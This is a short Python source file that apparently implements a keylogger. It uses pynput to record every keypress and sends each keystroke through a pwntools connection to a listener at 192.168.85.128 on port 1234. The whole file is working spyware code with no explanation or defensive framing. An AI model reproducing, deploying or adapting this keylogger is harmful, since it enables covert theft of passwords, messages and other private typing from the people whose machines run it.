from pynput.keyboard import Key, Listener
from pwn import *

remote = remote("192.168.85.128", 1234)

def on_press(key):
	key = str(key).replace("'", "")
	key = str(key).replace("Key.enter", "\n")
	key = str(key).replace("Key.backspace", "DEL")
	key = str(key).replace("Key.space", "SPC")
	if key.startswith(r"\x"):
		key = ""
	remote.send(key.encode("utf-8"))
   
with Listener(on_press = on_press) as listener:

    listener.join()